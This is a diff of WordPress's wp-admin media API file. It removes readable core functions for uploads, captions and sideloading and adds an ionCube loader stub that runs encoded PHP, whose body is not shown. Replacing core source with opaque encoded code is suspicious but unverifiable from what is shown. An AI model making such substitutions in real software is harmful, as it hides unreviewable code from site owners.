@@ -1,3266 +1,1604 @@
-<?php
-/**
- * WordPress Administration Media API.
- *
- * @package WordPress
- * @subpackage Administration
- */
-
-/**
- * Defines the default media upload tabs
- *
- * @since 2.5.0
- *
- * @return array default tabs
- */
-function media_upload_tabs() {
-	$_default_tabs = array(
-		'type' => __('From Computer'), // handler action suffix => tab text
-		'type_url' => __('From URL'),
-		'gallery' => __('Gallery'),
-		'library' => __('Media Library')
-	);
-
-	/**
-	 * Filters the available tabs in the legacy (pre-3.5.0) media popup.
-	 *
-	 * @since 2.5.0
-	 *
-	 * @param array $_default_tabs An array of media tabs.
-	 */
-	return apply_filters( 'media_upload_tabs', $_default_tabs );
-}
-
-/**
- * Adds the gallery tab back to the tabs array if post has image attachments
- *
- * @since 2.5.0
- *
- * @global wpdb $wpdb WordPress database abstraction object.
- *
- * @param array $tabs
- * @return array $tabs with gallery if post has image attachment
- */
-function update_gallery_tab($tabs) {
-	global $wpdb;
-
-	if ( !isset($_REQUEST['post_id']) ) {
-		unset($tabs['gallery']);
-		return $tabs;
-	}
-
-	$post_id = intval($_REQUEST['post_id']);
-
-	if ( $post_id )
-		$attachments = intval( $wpdb->get_var( $wpdb->prepare( "SELECT count(*) FROM $wpdb->posts WHERE post_type = 'attachment' AND post_status != 'trash' AND post_parent = %d", $post_id ) ) );
-
-	if ( empty($attachments) ) {
-		unset($tabs['gallery']);
-		return $tabs;
-	}
-
-	$tabs['gallery'] = sprintf(__('Gallery (%s)'), "<span id='attachments-count'>$attachments</span>");
-
-	return $tabs;
-}
-
-/**
- * Outputs the legacy media upload tabs UI.
- *
- * @since 2.5.0
- *
- * @global string $redir_tab
- */
-function the_media_upload_tabs() {
-	global $redir_tab;
-	$tabs = media_upload_tabs();
-	$default = 'type';
-
-	if ( !empty($tabs) ) {
-		echo "<ul id='sidemenu'>\n";
-		if ( isset($redir_tab) && array_key_exists($redir_tab, $tabs) ) {
-			$current = $redir_tab;
-		} elseif ( isset($_GET['tab']) && array_key_exists($_GET['tab'], $tabs) ) {
-			$current = $_GET['tab'];
-		} else {
-			/** This filter is documented in wp-admin/media-upload.php */
-			$current = apply_filters( 'media_upload_default_tab', $default );
-		}
-
-		foreach ( $tabs as $callback => $text ) {
-			$class = '';
-
-			if ( $current == $callback )
-				$class = " class='current'";
-
-			$href = add_query_arg(array('tab' => $callback, 's' => false, 'paged' => false, 'post_mime_type' => false, 'm' => false));
-			$link = "<a href='" . esc_url($href) . "'$class>$text</a>";
-			echo "\t<li id='" . esc_attr("tab-$callback") . "'>$link</li>\n";
-		}
-		echo "</ul>\n";
-	}
-}
-
-/**
- * Retrieves the image HTML to send to the editor.
- *
- * @since 2.5.0
- *
- * @param int          $id      Image attachment id.
- * @param string       $caption Image caption.
- * @param string       $title   Image title attribute.
- * @param string       $align   Image CSS alignment property.
- * @param string       $url     Optional. Image src URL. Default empty.
- * @param bool|string  $rel     Optional. Value for rel attribute or whether to add a default value. Default false.
- * @param string|array $size    Optional. Image size. Accepts any valid image size, or an array of width
- *                              and height values in pixels (in that order). Default 'medium'.
- * @param string       $alt     Optional. Image alt attribute. Default empty.
- * @return string The HTML output to insert into the editor.
- */
-function get_image_send_to_editor( $id, $caption, $title, $align, $url = '', $rel = false, $size = 'medium', $alt = '' ) {
-
-	$html = get_image_tag( $id, $alt, '', $align, $size );
-
-	if ( $rel ) {
-		if ( is_string( $rel ) ) {
-			$rel = ' rel="' . esc_attr( $rel ) . '"';
-		} else {
-			$rel = ' rel="attachment wp-att-' . intval( $id ) . '"';
-		}
-	} else {
-		$rel = '';
-	}
-
-	if ( $url )
-		$html = '<a href="' . esc_attr( $url ) . '"' . $rel . '>' . $html . '</a>';
-
-	/**
-	 * Filters the image HTML markup to send to the editor when inserting an image.
-	 *
-	 * @since 2.5.0
-	 *
-	 * @param string       $html    The image HTML markup to send.
-	 * @param int          $id      The attachment id.
-	 * @param string       $caption The image caption.
-	 * @param string       $title   The image title.
-	 * @param string       $align   The image alignment.
-	 * @param string       $url     The image source URL.
-	 * @param string|array $size    Size of image. Image size or array of width and height values
-	 *                              (in that order). Default 'medium'.
-	 * @param string       $alt     The image alternative, or alt, text.
-	 */
-	$html = apply_filters( 'image_send_to_editor', $html, $id, $caption, $title, $align, $url, $size, $alt );
-
-	return $html;
-}
-
-/**
- * Adds image shortcode with caption to editor
- *
- * @since 2.6.0
- *
- * @param string $html
- * @param integer $id
- * @param string $caption image caption
- * @param string $title image title attribute
- * @param string $align image css alignment property
- * @param string $url image src url
- * @param string $size image size (thumbnail, medium, large, full or added with add_image_size() )
- * @param string $alt image alt attribute
- * @return string
- */
-function image_add_caption( $html, $id, $caption, $title, $align, $url, $size, $alt = '' ) {
-
-	/**
-	 * Filters the caption text.
-	 *
-	 * Note: If the caption text is empty, the caption shortcode will not be appended
-	 * to the image HTML when inserted into the editor.
-	 *
-	 * Passing an empty value also prevents the {@see 'image_add_caption_shortcode'}
-	 * Filters from being evaluated at the end of image_add_caption().
-	 *
-	 * @since 4.1.0
-	 *
-	 * @param string $caption The original caption text.
-	 * @param int    $id      The attachment ID.
-	 */
-	$caption = apply_filters( 'image_add_caption_text', $caption, $id );
-
-	/**
-	 * Filters whether to disable captions.
-	 *
-	 * Prevents image captions from being appended to image HTML when inserted into the editor.
-	 *
-	 * @since 2.6.0
-	 *
-	 * @param bool $bool Whether to disable appending captions. Returning true to the filter
-	 *                   will disable captions. Default empty string.
-	 */
-	if ( empty($caption) || apply_filters( 'disable_captions', '' ) )
-		return $html;
-
-	$id = ( 0 < (int) $id ) ? 'attachment_' . $id : '';
-
-	if ( ! preg_match( '/width=["\']([0-9]+)/', $html, $matches ) )
-		return $html;
-
-	$width = $matches[1];
-
-	$caption = str_replace( array("\r\n", "\r"), "\n", $caption);
-	$caption = preg_replace_callback( '/<[a-zA-Z0-9]+(?: [^<>]+>)*/', '_cleanup_image_add_caption', $caption );
-
-	// Convert any remaining line breaks to <br>.
-	$caption = preg_replace( '/[ \n\t]*\n[ \t]*/', '<br />', $caption );
-
-	$html = preg_replace( '/(class=["\'][^\'"]*)align(none|left|right|center)\s?/', '$1', $html );
-	if ( empty($align) )
-		$align = 'none';
-
-	$shcode = '[caption id="' . $id . '" align="align' . $align	. '" width="' . $width . '"]' . $html . ' ' . $caption . '[/caption]';
-
-	/**
-	 * Filters the image HTML markup including the caption shortcode.
-	 *
-	 * @since 2.6.0
-	 *
-	 * @param string $shcode The image HTML markup with caption shortcode.
-	 * @param string $html   The image HTML markup.
-	 */
-	return apply_filters( 'image_add_caption_shortcode', $shcode, $html );
-}
-
-/**
- * Private preg_replace callback used in image_add_caption()
- *
- * @access private
- * @since 3.4.0
- */
-function _cleanup_image_add_caption( $matches ) {
-	// Remove any line breaks from inside the tags.
-	return preg_replace( '/[\r\n\t]+/', ' ', $matches[0] );
-}
-
-/**
- * Adds image html to editor
- *
- * @since 2.5.0
- *
- * @param string $html
- */
-function media_send_to_editor($html) {
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
-<script type="text/javascript">
-var win = window.dialogArguments || opener || parent || top;
-win.send_to_editor( <?php echo wp_json_encode( $html ); ?> );
-</script>
-<?php
-	exit;
-}
-
-/**
- * Save a file submitted from a POST request and create an attachment post for it.
- *
- * @since 2.5.0
- *
- * @param string $file_id   Index of the `$_FILES` array that the file was sent. Required.
- * @param int    $post_id   The post ID of a post to attach the media item to. Required, but can
- *                          be set to 0, creating a media item that has no relationship to a post.
- * @param array  $post_data Overwrite some of the attachment. Optional.
- * @param array  $overrides Override the wp_handle_upload() behavior. Optional.
- * @return int|WP_Error ID of the attachment or a WP_Error object on failure.
- */
-function media_handle_upload($file_id, $post_id, $post_data = array(), $overrides = array( 'test_form' => false )) {
-
-	$time = current_time('mysql');
-	if ( $post = get_post($post_id) ) {
-		// The post date doesn't usually matter for pages, so don't backdate this upload.
-		if ( 'page' !== $post->post_type && substr( $post->post_date, 0, 4 ) > 0 )
-			$time = $post->post_date;
-	}
-
-	$file = wp_handle_upload($_FILES[$file_id], $overrides, $time);
-
-	if ( isset($file['error']) )
-		return new WP_Error( 'upload_error', $file['error'] );
-
-	$name = $_FILES[$file_id]['name'];
-	$ext  = pathinfo( $name, PATHINFO_EXTENSION );
-	$name = wp_basename( $name, ".$ext" );
-
-	$url = $file['url'];
-	$type = $file['type'];
-	$file = $file['file'];
-	$title = sanitize_text_field( $name );
-	$content = '';
-	$excerpt = '';
-
-	if ( preg_match( '#^audio#', $type ) ) {
-		$meta = wp_read_audio_metadata( $file );
-
-		if ( ! empty( $meta['title'] ) ) {
-			$title = $meta['title'];
-		}
-
-		if ( ! empty( $title ) ) {
-
-			if ( ! empty( $meta['album'] ) && ! empty( $meta['artist'] ) ) {
-				/* translators: 1: audio track title, 2: album title, 3: artist name */
-				$content .= sprintf( __( '"%1$s" from %2$s by %3$s.' ), $title, $meta['album'], $meta['artist'] );
-			} elseif ( ! empty( $meta['album'] ) ) {
-				/* translators: 1: audio track title, 2: album title */
-				$content .= sprintf( __( '"%1$s" from %2$s.' ), $title, $meta['album'] );
-			} elseif ( ! empty( $meta['artist'] ) ) {
-				/* translators: 1: audio track title, 2: artist name */
-				$content .= sprintf( __( '"%1$s" by %2$s.' ), $title, $meta['artist'] );
-			} else {
-				/* translators: 1: audio track title */
-				$content .= sprintf( __( '"%s".' ), $title );
-			}
-
-		} elseif ( ! empty( $meta['album'] ) ) {
-
-			if ( ! empty( $meta['artist'] ) ) {
-				/* translators: 1: audio album title, 2: artist name */
-				$content .= sprintf( __( '%1$s by %2$s.' ), $meta['album'], $meta['artist'] );
-			} else {
-				$content .= $meta['album'] . '.';
-			}
-
-		} elseif ( ! empty( $meta['artist'] ) ) {
-
-			$content .= $meta['artist'] . '.';
-
-		}
-
-		if ( ! empty( $meta['year'] ) ) {
-			/* translators: Audio file track information. 1: Year of audio track release */
-			$content .= ' ' . sprintf( __( 'Released: %d.' ), $meta['year'] );
-		}
-
-		if ( ! empty( $meta['track_number'] ) ) {
-			$track_number = explode( '/', $meta['track_number'] );
-			if ( isset( $track_number[1] ) ) {
-				/* translators: Audio file track information. 1: Audio track number, 2: Total audio tracks */
-				$content .= ' ' . sprintf( __( 'Track %1$s of %2$s.' ), number_format_i18n( $track_number[0] ), number_format_i18n( $track_number[1] ) );
-			} else {
-				/* translators: Audio file track information. 1: Audio track number */
-				$content .= ' ' . sprintf( __( 'Track %1$s.' ), number_format_i18n( $track_number[0] ) );
-			}
-		}
-
-		if ( ! empty( $meta['genre'] ) ) {
-			/* translators: Audio file genre information. 1: Audio genre name */
-			$content .= ' ' . sprintf( __( 'Genre: %s.' ), $meta['genre'] );
-		}
-
-	// Use image exif/iptc data for title and caption defaults if possible.
-	} elseif ( 0 === strpos( $type, 'image/' ) && $image_meta = wp_read_image_metadata( $file ) ) {
-		if ( trim( $image_meta['title'] ) && ! is_numeric( sanitize_title( $image_meta['title'] ) ) ) {
-			$title = $image_meta['title'];
-		}
-
-		if ( trim( $image_meta['caption'] ) ) {
-			$excerpt = $image_meta['caption'];
-		}
-	}
-
-	// Construct the attachment array
-	$attachment = array_merge( array(
-		'post_mime_type' => $type,
-		'guid' => $url,
-		'post_parent' => $post_id,
-		'post_title' => $title,
-		'post_content' => $content,
-		'post_excerpt' => $excerpt,
-	), $post_data );
-
-	// This should never be set as it would then overwrite an existing attachment.
-	unset( $attachment['ID'] );
-
-	// Save the data
-	$id = wp_insert_attachment( $attachment, $file, $post_id, true );
-	if ( !is_wp_error($id) ) {
-		wp_update_attachment_metadata( $id, wp_generate_attachment_metadata( $id, $file ) );
-	}
-
-	return $id;
-
-}
-
-/**
- * Handles a side-loaded file in the same way as an uploaded file is handled by media_handle_upload().
- *
- * @since 2.6.0
- *
- * @param array  $file_array Array similar to a `$_FILES` upload array.
- * @param int    $post_id    The post ID the media is associated with.
- * @param string $desc       Optional. Description of the side-loaded file. Default null.
- * @param array  $post_data  Optional. Post data to override. Default empty array.
- * @return int|object The ID of the attachment or a WP_Error on failure.
- */
-function media_handle_sideload( $file_array, $post_id, $desc = null, $post_data = array() ) {
-	$overrides = array('test_form'=>false);
-
-	$time = current_time( 'mysql' );
-	if ( $post = get_post( $post_id ) ) {
-		if ( substr( $post->post_date, 0, 4 ) > 0 )
-			$time = $post->post_date;
-	}
-
-	$file = wp_handle_sideload( $file_array, $overrides, $time );
-	if ( isset($file['error']) )
-		return new WP_Error( 'upload_error', $file['error'] );
-
-	$url = $file['url'];
-	$type = $file['type'];
-	$file = $file['file'];
-	$title = preg_replace('/\.[^.]+$/', '', basename($file));
-	$content = '';
-
-	// Use image exif/iptc data for title and caption defaults if possible.
-	if ( $image_meta = wp_read_image_metadata( $file ) ) {
-		if ( trim( $image_meta['title'] ) && ! is_numeric( sanitize_title( $image_meta['title'] ) ) )
-			$title = $image_meta['title'];
-		if ( trim( $image_meta['caption'] ) )
-			$content = $image_meta['caption'];
-	}
-
-	if ( isset( $desc ) )
-		$title = $desc;
-
-	// Construct the attachment array.
-	$attachment = array_merge( array(
-		'post_mime_type' => $type,
-		'guid' => $url,
-		'post_parent' => $post_id,
-		'post_title' => $title,
-		'post_content' => $content,
-	), $post_data );
-
-	// This should never be set as it would then overwrite an existing attachment.
-	unset( $attachment['ID'] );
-
-	// Save the attachment metadata
-	$id = wp_insert_attachment($attachment, $file, $post_id);
-	if ( !is_wp_error($id) )
-		wp_update_attachment_metadata( $id, wp_generate_attachment_metadata( $id, $file ) );
-
-	return $id;
-}
-
-/**
- * Adds the iframe to display content for the media upload page
- *
- * @since 2.5.0
- *
- * @global int $body_id
- *
- * @param string|callable $content_func
- */
-function wp_iframe($content_func /* ... */) {
-	_wp_admin_html_begin();
-?>
-<title><?php bloginfo('name') ?> &rsaquo; <?php _e('Uploads'); ?> &#8212; <?php _e('WordPress'); ?></title>
-<?php
-
-wp_enqueue_style( 'colors' );
-// Check callback name for 'media'
-if ( ( is_array( $content_func ) && ! empty( $content_func[1] ) && 0 === strpos( (string) $content_func[1], 'media' ) )
-	|| ( ! is_array( $content_func ) && 0 === strpos( $content_func, 'media' ) ) )
-	wp_enqueue_style( 'deprecated-media' );
-wp_enqueue_style( 'ie' );
-?>
-<script type="text/javascript">
-addLoadEvent = function(func){if(typeof jQuery!="undefined")jQuery(document).ready(func);else if(typeof wpOnload!='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};
-var ajaxurl = '<?php echo admin_url( 'admin-ajax.php', 'relative' ); ?>', pagenow = 'media-upload-popup', adminpage = 'media-upload-popup',
-isRtl = <?php echo (int) is_rtl(); ?>;
-</script>
-<?php
-	/** This action is documented in wp-admin/admin-header.php */
-	do_action( 'admin_enqueue_scripts', 'media-upload-popup' );
-
-	/**
-	 * Fires when admin styles enqueued for the legacy (pre-3.5.0) media upload popup are printed.
-	 *
-	 * @since 2.9.0
-	 */
-	do_action( 'admin_print_styles-media-upload-popup' );
-
-	/** This action is documented in wp-admin/admin-header.php */
-	do_action( 'admin_print_styles' );
-
-	/**
-	 * Fires when admin scripts enqueued for the legacy (pre-3.5.0) media upload popup are printed.
-	 *
-	 * @since 2.9.0
-	 */
-	do_action( 'admin_print_scripts-media-upload-popup' );
-
-	/** This action is documented in wp-admin/admin-header.php */
-	do_action( 'admin_print_scripts' );
-
-	/**
-	 * Fires when scripts enqueued for the admin header for the legacy (pre-3.5.0)
-	 * media upload popup are printed.
-	 *
-	 * @since 2.9.0
-	 */
-	do_action( 'admin_head-media-upload-popup' );
-
-	/** This action is documented in wp-admin/admin-header.php */
-	do_action( 'admin_head' );
-
-if ( is_string( $content_func ) ) {
-	/**
-	 * Fires in the admin header for each specific form tab in the legacy
-	 * (pre-3.5.0) media upload popup.
-	 *
-	 * The dynamic portion of the hook, `$content_func`, refers to the form
-	 * callback for the media upload type. Possible values include
-	 * 'media_upload_type_form', 'media_upload_type_url_form', and
-	 * 'media_upload_library_form'.
-	 *
-	 * @since 2.5.0
-	 */
-	do_action( "admin_head_{$content_func}" );
-}
-?>
-</head>
-<body<?php if ( isset($GLOBALS['body_id']) ) echo ' id="' . $GLOBALS['body_id'] . '"'; ?> class="wp-core-ui no-js">
-<script type="text/javascript">
-document.body.className = document.body.className.replace('no-js', 'js');
-</script>
-<?php
-	$args = func_get_args();
-	$args = array_slice($args, 1);
-	call_user_func_array($content_func, $args);
-
-	/** This action is documented in wp-admin/admin-footer.php */
-	do_action( 'admin_print_footer_scripts' );
-?>
-<script type="text/javascript">if(typeof wpOnload=='function')wpOnload();</script>
-</body>
-</html>
-<?php
-}
-
-/**
- * Adds the media button to the editor
- *
- * @since 2.5.0
- *
- * @global int $post_ID
- *
- * @staticvar int $instance
- *
- * @param string $editor_id
- */
-function media_buttons($editor_id = 'content') {
-	static $instance = 0;
-	$instance++;
-
-	$post = get_post();
-	if ( ! $post && ! empty( $GLOBALS['post_ID'] ) )
-		$post = $GLOBALS['post_ID'];
-
-	wp_enqueue_media( array(
-		'post' => $post
-	) );
-
-	$img = '<span class="wp-media-buttons-icon"></span> ';
-
-	$id_attribute = $instance === 1 ? ' id="insert-media-button"' : '';
-	printf( '<button type="button"%s class="button insert-media add_media" data-editor="%s">%s</button>',
-		$id_attribute,
-		esc_attr( $editor_id ),
-		$img . __( 'Add Media' )
-	);
-	/**
-	 * Filters the legacy (pre-3.5.0) media buttons.
-	 *
-	 * Use {@see 'media_buttons'} action instead.
-	 *
-	 * @since 2.5.0
-	 * @deprecated 3.5.0 Use {@see 'media_buttons'} action instead.
-	 *
-	 * @param string $string Media buttons context. Default empty.
-	 */
-	$legacy_filter = apply_filters( 'media_buttons_context', '' );
-
-	if ( $legacy_filter ) {
-		// #WP22559. Close <a> if a plugin started by closing <a> to open their own <a> tag.
-		if ( 0 === stripos( trim( $legacy_filter ), '</a>' ) )
-			$legacy_filter .= '</a>';
-		echo $legacy_filter;
-	}
-}
-
-/**
- *
- * @global int $post_ID
- * @param string $type
- * @param int $post_id
- * @param string $tab
- * @return string
- */
-function get_upload_iframe_src( $type = null, $post_id = null, $tab = null ) {
-	global $post_ID;
-
-	if ( empty( $post_id ) )
-		$post_id = $post_ID;
-
-	$upload_iframe_src = add_query_arg( 'post_id', (int) $post_id, admin_url('media-upload.php') );
-
-	if ( $type && 'media' != $type )
-		$upload_iframe_src = add_query_arg('type', $type, $upload_iframe_src);
-
-	if ( ! empty( $tab ) )
-		$upload_iframe_src = add_query_arg('tab', $tab, $upload_iframe_src);
-
-	/**
-	 * Filters the upload iframe source URL for a specific media type.
-	 *
-	 * The dynamic portion of the hook name, `$type`, refers to the type
-	 * of media uploaded.
-	 *
-	 * @since 3.0.0
-	 *
-	 * @param string $upload_iframe_src The upload iframe source URL by type.
-	 */
-	$upload_iframe_src = apply_filters( "{$type}_upload_iframe_src", $upload_iframe_src );
-
-	return add_query_arg('TB_iframe', true, $upload_iframe_src);
-}
-
-/**
- * Handles form submissions for the legacy media uploader.
- *
- * @since 2.5.0
- *
- * @return mixed void|object WP_Error on failure
- */
-function media_upload_form_handler() {
-	check_admin_referer('media-form');
-
-	$errors = null;
-
-	if ( isset($_POST['send']) ) {
-		$keys = array_keys( $_POST['send'] );
-		$send_id = (int) reset( $keys );
-	}
-
-	if ( !empty($_POST['attachments']) ) foreach ( $_POST['attachments'] as $attachment_id => $attachment ) {
-		$post = $_post = get_post($attachment_id, ARRAY_A);
-
-		if ( !current_user_can( 'edit_post', $attachment_id ) )
-			continue;
-
-		if ( isset($attachment['post_content']) )
-			$post['post_content'] = $attachment['post_content'];
-		if ( isset($attachment['post_title']) )
-			$post['post_title'] = $attachment['post_title'];
-		if ( isset($attachment['post_excerpt']) )
-			$post['post_excerpt'] = $attachment['post_excerpt'];
-		if ( isset($attachment['menu_order']) )
-			$post['menu_order'] = $attachment['menu_order'];
-
-		if ( isset($send_id) && $attachment_id == $send_id ) {
-			if ( isset($attachment['post_parent']) )
-				$post['post_parent'] = $attachment['post_parent'];
-		}
-
-		/**
-		 * Filters the attachment fields to be saved.
-		 *
-		 * @since 2.5.0
-		 *
-		 * @see wp_get_attachment_metadata()
-		 *
-		 * @param array $post       An array of post data.
-		 * @param array $attachment An array of attachment metadata.
-		 */
-		$post = apply_filters( 'attachment_fields_to_save', $post, $attachment );
-
-		if ( isset($attachment['image_alt']) ) {
-			$image_alt = wp_unslash( $attachment['image_alt'] );
-			if ( $image_alt != get_post_meta($attachment_id, '_wp_attachment_image_alt', true) ) {
-				$image_alt = wp_strip_all_tags( $image_alt, true );
-
-				// Update_meta expects slashed.
-				update_post_meta( $attachment_id, '_wp_attachment_image_alt', wp_slash( $image_alt ) );
-			}
-		}
-
-		if ( isset($post['errors']) ) {
-			$errors[$attachment_id] = $post['errors'];
-			unset($post['errors']);
-		}
-
-		if ( $post != $_post )
-			wp_update_post($post);
-
-		foreach ( get_attachment_taxonomies($post) as $t ) {
-			if ( isset($attachment[$t]) )
-				wp_set_object_terms($attachment_id, array_map('trim', preg_split('/,+/', $attachment[$t])), $t, false);
-		}
-	}
-
-	if ( isset($_POST['insert-gallery']) || isset($_POST['update-gallery']) ) { ?>
-		<script type="text/javascript">
-		var win = window.dialogArguments || opener || parent || top;
-		win.tb_remove();
-		</script>
-		<?php
-		exit;
-	}
-
-	if ( isset($send_id) ) {
-		$attachment = wp_unslash( $_POST['attachments'][$send_id] );
-
-		$html = isset( $attachment['post_title'] ) ? $attachment['post_title'] : '';
-		if ( !empty($attachment['url']) ) {
-			$rel = '';
-			if ( strpos($attachment['url'], 'attachment_id') || get_attachment_link($send_id) == $attachment['url'] )
-				$rel = " rel='attachment wp-att-" . esc_attr($send_id) . "'";
-			$html = "<a href='{$attachment['url']}'$rel>$html</a>";
-		}
-
-		/**
-		 * Filters the HTML markup for a media item sent to the editor.
-		 *
-		 * @since 2.5.0
-		 *
-		 * @see wp_get_attachment_metadata()
-		 *
-		 * @param string $html       HTML markup for a media item sent to the editor.
-		 * @param int    $send_id    The first key from the $_POST['send'] data.
-		 * @param array  $attachment Array of attachment metadata.
-		 */
-		$html = apply_filters( 'media_send_to_editor', $html, $send_id, $attachment );
-		return media_send_to_editor($html);
-	}
-
-	return $errors;
-}
-
-/**
- * Handles the process of uploading media.
- *
- * @since 2.5.0
- *
- * @return null|string
- */
-function wp_media_upload_handler() {
-	$errors = array();
-	$id = 0;
-
-	if ( isset($_POST['html-upload']) && !empty($_FILES) ) {
-		check_admin_referer('media-form');
-		// Upload File button was clicked
-		$id = media_handle_upload('async-upload', $_REQUEST['post_id']);
-		unset($_FILES);
-		if ( is_wp_error($id) ) {
-			$errors['upload_error'] = $id;
-			$id = false;
-		}
-	}
-
-	if ( !empty($_POST['insertonlybutton']) ) {
-		$src = $_POST['src'];
-		if ( !empty($src) && !strpos($src, '://') )
-			$src = "http://$src";
-
-		if ( isset( $_POST['media_type'] ) && 'image' != $_POST['media_type'] ) {
-			$title = esc_html( wp_unslash( $_POST['title'] ) );
-			if ( empty( $title ) )
-				$title = esc_html( basename( $src ) );
-
-			if ( $title && $src )
-				$html = "<a href='" . esc_url($src) . "'>$title</a>";
-
-			$type = 'file';
-			if ( ( $ext = preg_replace( '/^.+?\.([^.]+)$/', '$1', $src ) ) && ( $ext_type = wp_ext2type( $ext ) )
-				&& ( 'audio' == $ext_type || 'video' == $ext_type ) )
-					$type = $ext_type;
-
-			/**
-			 * Filters the URL sent to the editor for a specific media type.
-			 *
-			 * The dynamic portion of the hook name, `$type`, refers to the type
-			 * of media being sent.
-			 *
-			 * @since 3.3.0
-			 *
-			 * @param string $html  HTML markup sent to the editor.
-			 * @param string $src   Media source URL.
-			 * @param string $title Media title.
-			 */
-			$html = apply_filters( "{$type}_send_to_editor_url", $html, esc_url_raw( $src ), $title );
-		} else {
-			$align = '';
-			$alt = esc_attr( wp_unslash( $_POST['alt'] ) );
-			if ( isset($_POST['align']) ) {
-				$align = esc_attr( wp_unslash( $_POST['align'] ) );
-				$class = " class='align$align'";
-			}
-			if ( !empty($src) )
-				$html = "<img src='" . esc_url($src) . "' alt='$alt'$class />";
-
-			/**
-			 * Filters the image URL sent to the editor.
-			 *
-			 * @since 2.8.0
-			 *
-			 * @param string $html  HTML markup sent to the editor for an image.
-			 * @param string $src   Image source URL.
-			 * @param string $alt   Image alternate, or alt, text.
-			 * @param string $align The image alignment. Default 'alignnone'. Possible values include
-			 *                      'alignleft', 'aligncenter', 'alignright', 'alignnone'.
-			 */
-			$html = apply_filters( 'image_send_to_editor_url', $html, esc_url_raw( $src ), $alt, $align );
-		}
-
-		return media_send_to_editor($html);
-	}
-
-	if ( isset( $_POST['save'] ) ) {
-		$errors['upload_notice'] = __('Saved.');
-		wp_enqueue_script( 'admin-gallery' );
- 		return wp_iframe( 'media_upload_gallery_form', $errors );
-
-	} elseif ( ! empty( $_POST ) ) {
-		$return = media_upload_form_handler();
-
-		if ( is_string($return) )
-			return $return;
-		if ( is_array($return) )
-			$errors = $return;
-	}
-
-	if ( isset($_GET['tab']) && $_GET['tab'] == 'type_url' ) {
-		$type = 'image';
-		if ( isset( $_GET['type'] ) && in_array( $_GET['type'], array( 'video', 'audio', 'file' ) ) )
-			$type = $_GET['type'];
-		return wp_iframe( 'media_upload_type_url_form', $type, $errors, $id );
-	}
-
-	return wp_iframe( 'media_upload_type_form', 'image', $errors, $id );
-}
-
-/**
- * Downloads an image from the specified URL and attaches it to a post.
- *
- * @since 2.6.0
- * @since 4.2.0 Introduced the `$return` parameter.
- * @since 4.8.0 Introduced the 'id' option within the `$return` parameter.
- *
- * @param string $file    The URL of the image to download.
- * @param int    $post_id The post ID the media is to be associated with.
- * @param string $desc    Optional. Description of the image.
- * @param string $return  Optional. Accepts 'html' (image tag html) or 'src' (URL), or 'id' (attachment ID). Default 'html'.
- * @return string|WP_Error Populated HTML img tag on success, WP_Error object otherwise.
- */
-function media_sideload_image( $file, $post_id, $desc = null, $return = 'html' ) {
-	if ( ! empty( $file ) ) {
-
-		// Set variables for storage, fix file filename for query strings.
-		preg_match( '/[^\?]+\.(jpe?g|jpe|gif|png)\b/i', $file, $matches );
-		if ( ! $matches ) {
-			return new WP_Error( 'image_sideload_failed', __( 'Invalid image URL' ) );
-		}
-
-		$file_array = array();
-		$file_array['name'] = basename( $matches[0] );
-
-		// Download file to temp location.
-		$file_array['tmp_name'] = download_url( $file );
-
-		// If error storing temporarily, return the error.
-		if ( is_wp_error( $file_array['tmp_name'] ) ) {
-			return $file_array['tmp_name'];
-		}
-
-		// Do the validation and storage stuff.
-		$id = media_handle_sideload( $file_array, $post_id, $desc );
-
-		// If error storing permanently, unlink.
-		if ( is_wp_error( $id ) ) {
-			@unlink( $file_array['tmp_name'] );
-			return $id;
-		// If attachment id was requested, return it early.
-		} elseif ( $return === 'id' ) {
-			return $id;
-		}
-
-		$src = wp_get_attachment_url( $id );
-	}
-
-	// Finally, check to make sure the file has been saved, then return the HTML.
-	if ( ! empty( $src ) ) {
-		if ( $return === 'src' ) {
-			return $src;
-		}
-
-		$alt = isset( $desc ) ? esc_attr( $desc ) : '';
-		$html = "<img src='$src' alt='$alt' />";
-		return $html;
-	} else {
-		return new WP_Error( 'image_sideload_failed' );
-	}
-}
-
-/**
- * Retrieves the legacy media uploader form in an iframe.
- *
- * @since 2.5.0
- *
- * @return string|null
- */
-function media_upload_gallery() {
-	$errors = array();
-
-	if ( !empty($_POST) ) {
-		$return = media_upload_form_handler();
-
-		if ( is_string($return) )
-			return $return;
-		if ( is_array($return) )
-			$errors = $return;
-	}
-
-	wp_enqueue_script('admin-gallery');
-	return wp_iframe( 'media_upload_gallery_form', $errors );
-}
-
-/**
- * Retrieves the legacy media library form in an iframe.
- *
- * @since 2.5.0
- *
- * @return string|null
- */
-function media_upload_library() {
-	$errors = array();
-	if ( !empty($_POST) ) {
-		$return = media_upload_form_handler();
-
-		if ( is_string($return) )
-			return $return;
-		if ( is_array($return) )
-			$errors = $return;
-	}
-
-	return wp_iframe( 'media_upload_library_form', $errors );
-}
-
-/**
- * Retrieve HTML for the image alignment radio buttons with the specified one checked.
- *
- * @since 2.7.0
- *
- * @param WP_Post $post
- * @param string $checked
- * @return string
- */
-function image_align_input_fields( $post, $checked = '' ) {
-
-	if ( empty($checked) )
-		$checked = get_user_setting('align', 'none');
-
-	$alignments = array('none' => __('None'), 'left' => __('Left'), 'center' => __('Center'), 'right' => __('Right'));
-	if ( !array_key_exists( (string) $checked, $alignments ) )
-		$checked = 'none';
-
-	$out = array();
